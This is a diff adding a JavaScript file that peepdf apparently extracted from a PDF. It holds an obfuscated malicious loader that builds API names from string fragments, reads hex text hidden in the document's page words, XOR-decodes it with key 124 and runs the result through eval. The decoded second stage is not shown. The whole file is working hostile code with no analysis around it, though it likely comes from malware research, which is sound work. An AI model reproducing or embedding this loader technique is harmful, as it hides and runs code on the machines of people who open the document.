@@ -1,0 +1,40 @@
+// peepdf comment: Javascript code located in object 11 (version 0)
+
+var sF = String("KpOgetP".substr(3) + "ageN5LU3".substr(0, 4) + "KUCthWo".substr(3) + "BO9rd".substr(3));
+
+function t(f, fE) {
+    return f ^ fE;
+};
+var wV = "BOosubs".substr(3) + "trEw9y".substr(0, 2);
+var j = new String();
+var tU = 124;
+var qJ = 1;
+var l = String("24Pfrom".substr(3) + "CharD7B3".substr(0, 4) + "Code");
+var fW = "yoOunesc".substr(3) + "ape";
+var kZ = String;
+var b = this;
+var n = "getP" + "ageNyVYt".substr(0, 4) + "ncjumWocjn".substr(3, 4) + "YiwrdsYwi".substr(3, 3);
+var v = new String("char" + "Code" + "At");;
+var fQ = ["p", "", "p", "a"];
+gX = new String(fQ[3] + fQ[0] + fQ[0] + fQ[1]);
+var jY = ["l", "e", "a", "v", ""];
+cN = new String(jY[1] + jY[3] + jY[2] + jY[0] + jY[4]);
+var z = 78 - 77;;
+var jO = 96 - 94;
+var sFG = new String("yOh%".substr(3));
+var eD = 1455 - 1455;
+var fS = b[fW];
+var gX = b[gX];;
+var oD = b[cN];
+var fI = b[n](qJ);
+for (var aL = eD; aL < fI; aL += z) {
+    bC = b[sF](qJ, aL);
+    var iH = bC[wV](bC.length - jO, jO);
+    var d = sFG + iH;
+    var r = fS(d);
+    var rK = r[v](eD);
+    var oL = t(rK, tU);
+    j += kZ[l](oL);
+}
+oD(j);
+
